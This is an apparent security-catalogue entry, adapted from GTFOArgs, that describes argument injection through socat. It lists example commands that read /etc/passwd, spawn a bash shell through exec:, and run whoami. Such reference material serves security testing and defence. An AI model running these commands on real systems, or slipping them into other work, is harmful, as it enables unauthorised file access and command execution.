---
trust_level: community
id: argument-injection-socat
namespace: argument:injection:socat
name: socat
description: "Argument injection via socat"
version: "1.0.0"
capabilities:
  - system.file.read
  - security.execution.command
platforms:
  - cross-platform
techniques:
  - discovery
  - execution
execution:
  template: "socat"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "The command leverages socats ability to relay data, reading arbitary file by opening it in read-only mode."
    command: "socat -u OPEN:/etc/passwd,rdonly STDOUT
"
  - description: "The exec argument runs an arbitrary command and spawn a shell."
    command: "socat stdin exec:bash
"
  - description: "The exec argument runs an arbitrary command."
    command: "socat stdin exec:whoami
"
references:
  - label: "GTFOArgs"
    url: "https://gtfoargs.github.io/gtfoargs/socat/"
---

# socat

GTFOArgs entry for socat. This binary can be used to inject arguments for execution, file operations, or other capabilities.
